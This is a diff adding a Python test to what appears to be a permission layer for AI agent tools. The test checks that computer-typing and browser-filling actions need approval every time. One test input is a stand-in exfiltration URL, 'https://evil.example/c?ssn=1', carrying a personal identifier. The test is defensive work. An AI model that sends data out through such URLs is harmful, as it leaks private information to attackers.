@@ -350,6 +350,16 @@ def test_a_grant_never_covers_an_argument_it_did_not_see():
                           {"to": "boss@corp.com", "body": "two"})
 
 
+def test_ui_driving_sinks_are_asked_every_time():
+    """For computer/browser the typed ``text`` can be the URL or recipient."""
+    assert not _granted_twice("computer", {"action": "type", "text": "hello"},
+                              {"action": "type", "text": "https://evil.example/c?ssn=1"})
+    assert not _granted_twice("browser", {"action": "fill", "selector": "input[name=to]",
+                                          "text": "a@corp.com"},
+                              {"action": "fill", "selector": "input[name=to]",
+                               "text": "a@corp.com"})
+
+
 def test_search_queries_are_data_so_a_search_is_asked_every_time():
     assert ifc.destination({"q": "payroll 1017 Dana"}, "web_search") == ""
     assert not _granted_twice("web_search", {"q": "x"}, {"q": "x"})
